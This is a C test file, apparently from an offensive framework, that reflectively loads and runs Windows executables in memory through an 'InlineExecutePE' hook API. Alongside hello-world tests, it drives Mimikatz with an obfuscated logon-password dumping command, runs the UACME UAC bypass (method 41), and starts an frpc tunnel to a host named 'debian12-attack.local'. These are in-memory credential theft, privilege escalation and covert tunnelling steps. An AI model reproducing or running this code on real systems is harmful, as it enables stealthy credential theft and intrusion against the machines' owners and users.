// clang-format off
#include <Windows.h>
#include <TlHelp32.h>
// clang-format on
#include "../../hookspub.h"
#include <conio.h>
#include <stdio.h>

extern HookResult InlineExecutePE(HookFeatures features, bool isBackground,
                                  int runningTimeoutMs, void *stdin_,
                                  int stdinSize, void *peImage, int peImageSize,
                                  char *commandLineA, int commandLineASize,
                                  void **loadedImageBase, int jobVersion);
extern void InlineLogPE(void *imageBase);
extern HookResult InlineWaitPE(void *imageBase, int waitingTimeoutMs);
extern void InlineListPE();

static void *readfile(const char *filename, size_t *size) {
  if (!filename)
    return NULL;

  FILE *file = NULL;
  size_t filesize = 0;
  void *data = NULL;

  // Open the file
  file = fopen(filename, "rb");
  if (!file) {
    printf("Can't open file: %s", filename);
    goto err;
  }
  fseek(file, 0, SEEK_END);
  filesize = ftell(file);
  if (filesize == -1) {
    printf("Can't get size of file: %s", filename);
    goto err;
  }
  rewind(file);

  // Read the file
  data = malloc(filesize);
  if (!data || fread(data, 1, filesize, file) != filesize) {
    printf("Can't read file with size %zu: %s", filesize, filename);
    goto err;
  }

  if (size)
    *size = filesize;
  fclose(file);
  return data;

err:
  if (size)
    *size = 0;
  if (data)
    free(data);
  if (file)
    fclose(file);
  return NULL;
}

#ifdef _WIN64
#define archstr "x64"
#else
#define archstr "x86"
#endif
#define loopcount 1
#define statement_after_execution // Sleep(30 * 1000)

void test_c() {
  HookFeatures features = HookFeatureRedirectStdio |
                          HookFeatureStreamingOutput | HookFeatureCommandLine |
                          HookFeatureUnload | HookFeatureCpp;
  char stdin_[] = "";
  char commandLine[] = "dummy.exe arg1 \"a r g 2\" 中文";
  size_t peImageSize = 0;
  void *peImage = readfile("helloworld_c." archstr ".exe", &peImageSize);
  void *imageBase = NULL;
  HookResult result = HookResultSuccess;
  if (peImage) {
    for (size_t i = 0; i < loopcount; i++) {
      result = InlineExecutePE(features, true, 0, stdin_, sizeof(stdin_),
                               peImage, (int)peImageSize, commandLine,
                               sizeof(commandLine), &imageBase, 0);
      if (result != HookResultSuccess)
        __debugbreak();
      InlineListPE();
      result = InlineWaitPE(imageBase, (int)INFINITE);
      if (result != HookResultSuccess)
        __debugbreak();
      statement_after_execution;
    }
    free(peImage);
  }
}

void test_go() {
  HookFeatures features = HookFeatureRedirectStdio |
                          HookFeatureStreamingOutput | HookFeatureCommandLine |
                          HookFeatureUnload | HookFeatureGo |
                          HookFeatureGoCobraFakeParentProcess;
  char stdin_[] = "";
  char commandLine[] = "dummy.exe arg1 \"a r g 2\" 中文";
  size_t peImageSize = 0;
  void *peImage = readfile("helloworld_go." archstr ".exe", &peImageSize);
  void *imageBase = NULL;
  HookResult result = HookResultSuccess;
  if (peImage) {
    for (size_t i = 0; i < loopcount; i++) {
      result = InlineExecutePE(features, true, 0, stdin_, sizeof(stdin_),
                               peImage, (int)peImageSize, commandLine,
                               sizeof(commandLine), &imageBase, 0);
      if (result != HookResultSuccess)
        __debugbreak();
      InlineLogPE(imageBase);
      InlineListPE();
      result = InlineWaitPE(imageBase, (int)INFINITE);
      if (result != HookResultSuccess)
        __debugbreak();
      statement_after_execution;
    }
    free(peImage);
  }
}

void test_seh() {
  HookFeatures features = HookFeatureStreamingOutput | HookFeatureUnload |
                          HookFeatureCpp | HookFeatureCppSEH;
  char stdin_[] = "";
  char commandLine[] = "dummy.exe arg1 \"a r g 2\" 中文";
  size_t peImageSize = 0;
  void *peImage = readfile("helloworld_seh_c." archstr ".exe", &peImageSize);
  void *imageBase = NULL;
  HookResult result = HookResultSuccess;
  if (peImage) {
    for (size_t i = 0; i < loopcount; i++) {
      result = InlineExecutePE(features, false, (int)INFINITE, stdin_,
                               sizeof(stdin_), peImage, (int)peImageSize,
                               commandLine, sizeof(commandLine), &imageBase, 0);
      if (result != HookResultSuccess)
        __debugbreak();
      statement_after_execution;
    }
    free(peImage);
  }
}

void test_frpc() {
  HookFeatures features = HookFeatureRedirectStdio |
                          HookFeatureStreamingOutput | HookFeatureCommandLine |
                          HookFeatureUnload | HookFeatureGo |
                          HookFeatureGoCobraFakeParentProcess;
  char stdin_[] = "";
  char commandLine[] =
      "dummy.exe stcp -s debian12-attack.local -P 7001 -t 123456 -n test1 -l "
      "8000 --disable-log-color --log-level debug";
  size_t peImageSize = 0;
  void *peImage = readfile("frpc.exe", &peImageSize);
  void *imageBase = NULL;
  HookResult result = HookResultSuccess;
  if (peImage) {
    result = InlineExecutePE(features, true, 0, stdin_, sizeof(stdin_), peImage,
                             (int)peImageSize, commandLine, sizeof(commandLine),
                             &imageBase, 0);
    if (result != HookResultSuccess)
      __debugbreak();
    for (int i = 0; i < 1000; i++) {
      Sleep(5000);
      InlineLogPE(imageBase);
    }
    result = InlineWaitPE(imageBase, (int)INFINITE);
    if (result != HookResultSuccess)
      __debugbreak();
    statement_after_execution;
    free(peImage);
  }
}

void test_gohttpserver() {
  HookFeatures features = HookFeatureRedirectStdio |
                          HookFeatureStreamingOutput | HookFeatureCommandLine |
                          HookFeatureUnload | HookFeatureGo;
  char stdin_[] = "";
  char commandLine[] = "dummy.exe";
  size_t peImageSize = 0;
  void *peImage = readfile("gohttpserver.exe", &peImageSize);
  void *imageBase = NULL;
  HookResult result = HookResultSuccess;
  if (peImage) {
    result = InlineExecutePE(features, true, 0, stdin_, sizeof(stdin_), peImage,
                             (int)peImageSize, commandLine, sizeof(commandLine),
                             &imageBase, 0);
    if (result != HookResultSuccess)
      __debugbreak();
    for (int i = 0; i < 1000; i++) {
      Sleep(5000);
      InlineLogPE(imageBase);
    }
    result = InlineWaitPE(imageBase, (int)INFINITE);
    if (result != HookResultSuccess)
      __debugbreak();
    statement_after_execution;
    free(peImage);
  }
}

void test_uacme() {
  HookFeatures features = HookFeatureRedirectStdio |
                          HookFeatureStreamingOutput | HookFeatureCommandLine |
                          HookFeatureUnload | HookFeatureCpp |
                          HookFeatureCppSEH;
  char stdin_[] = "";
  char commandLine[] = "dummy.exe 41";
  size_t peImageSize = 0;
  void *peImage = readfile("UACME." archstr ".exe", &peImageSize);
  void *imageBase = NULL;
  HookResult result = HookResultSuccess;
  if (peImage) {
    result = InlineExecutePE(features, false, (int)INFINITE, stdin_,
                             sizeof(stdin_), peImage, (int)peImageSize,
                             commandLine, sizeof(commandLine), &imageBase, 0);
    if (result != HookResultSuccess)
      __debugbreak();
    statement_after_execution;
    free(peImage);
  }
}

void test_mimikatz() {
  HookFeatures features = HookFeatureRedirectStdio |
                          HookFeatureStreamingOutput | HookFeatureCommandLine |
                          HookFeatureUnload | HookFeatureCpp |
                          HookFeatureCppSEH;
  char stdin_[] = "";
  char commandLine[] = "mimikatz.exe privi_lege::debug sekur_lsa::logon_passw_ords exit";
  size_t peImageSize = 0;
  void *peImage = readfile("mimikatz.exe", &peImageSize);
  void *imageBase = NULL;
  HookResult result = HookResultSuccess;
  if (peImage) {
    result = InlineExecutePE(features, false, (int)INFINITE, stdin_,
                             sizeof(stdin_), peImage, (int)peImageSize,
                             commandLine, sizeof(commandLine), &imageBase, 0);
    if (result != HookResultSuccess)
      __debugbreak();
    statement_after_execution;
    free(peImage);
  }
}

int main() { 
    test_seh(); }
